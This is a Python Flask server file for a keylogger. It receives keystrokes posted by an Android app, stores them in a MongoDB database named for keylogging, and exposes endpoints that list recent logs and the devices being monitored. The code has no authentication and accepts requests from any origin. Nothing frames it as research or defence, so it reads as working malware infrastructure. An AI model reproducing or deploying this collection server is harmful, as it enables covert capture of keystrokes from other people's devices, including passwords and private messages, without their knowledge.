from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime
import os
from dotenv import load_dotenv
import pymongo

load_dotenv()

app = Flask(__name__)
CORS(app)  # Allow all origins

# MongoDB connection
MONGO_URI = os.getenv("MONGO_URI", "mongodb://localhost:27017")
client = pymongo.MongoClient(MONGO_URI)
database = client.keylogger_db
logs_collection = database.keylogs

@app.route('/')
def root():
    return {"message": "Keylogger API is running", "status": "active"}

@app.route('/api/keylog', methods=['POST'])
def receive_keystroke():
    """Receive keystrokes from the Android app"""
    try:
        data = request.json
        data['timestamp'] = data.get('timestamp', datetime.now())
        result = logs_collection.insert_one(data)
        return jsonify({
            "success": True,
            "id": str(result.inserted_id),
            "message": "Keystrokes saved successfully"
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/logs')
def get_logs():
    """Get recent keystroke logs"""
    try:
        limit = request.args.get('limit', 100, type=int)
        logs = list(logs_collection.find().sort('timestamp', -1).limit(limit))
        for log in logs:
            log['id'] = str(log['_id'])
            del log['_id']
        return jsonify(logs)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/stats')
def get_stats():
    """Get basic statistics"""
    try:
        total = logs_collection.count_documents({})
        devices = logs_collection.distinct('deviceId')
        return jsonify({
            "total_keystrokes": total,
            "unique_devices": len(devices),
            "devices": devices
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
